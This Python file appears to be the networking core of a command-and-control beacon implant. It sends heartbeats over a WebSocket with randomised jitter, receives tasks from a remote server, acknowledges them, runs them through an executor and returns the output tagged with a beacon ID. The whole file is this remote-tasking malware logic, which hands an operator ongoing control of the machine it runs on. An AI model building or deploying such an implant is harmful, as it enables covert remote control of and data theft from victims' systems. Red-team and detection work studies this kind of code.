import asyncio
import random
import json
from logger import logger
from config import settings
from utils import get_system_info


async def send_heartbeat(ws):
    while True:
        try:
            status_payload = {
                "type": "heartbeat",
                "beacon_id": settings.BEACON_ID,
                "status": "active"
            }
            await ws.send_json(status_payload)
            logger.debug("Heartbeat callback successful.")

        except Exception as e:
            logger.warning(f"Heartbeat failed: {e}")
            break

        jitter_range = settings.SLEEP_TIME * settings.JITTER
        sleep_time = settings.SLEEP_TIME + random.uniform(-jitter_range, jitter_range)

        await asyncio.sleep(max(1, sleep_time))


async def handle_incoming(ws, executor):
    try:
        async for message in ws:
            try:
                data = json.loads(message) if isinstance(message, str) else message

                command_type = data.get("type")
                task_id = data.get("task_id", "0000")

                logger.info(f"[*] Task Received [{task_id}]: {command_type}")

                await ws.send_json({"type": "task_ack", "task_id": task_id})

                asyncio.create_task(run_task_and_respond(ws, executor, data))

            except json.JSONDecodeError:
                logger.error("[-] Received malformed command packet.")
            except Exception as e:
                logger.error(f"[-] Handler routing error: {e}")

    except Exception as e:
        logger.error(f"[-] WebSocket stream interrupted: {e}")


async def run_task_and_respond(ws, executor, data):
    task_id = data.get("task_id")
    try:
        result = await executor.execute(data)

        response = {
            "type": "task_result",
            "task_id": task_id,
            "beacon_id": settings.BEACON_ID,
            "output": result
        }
        await ws.send_json(response)

    except Exception as e:
        error_msg = f"Task {task_id} execution failed: {str(e)}"
        await ws.send_json({"type": "error", "task_id": task_id, "msg": error_msg})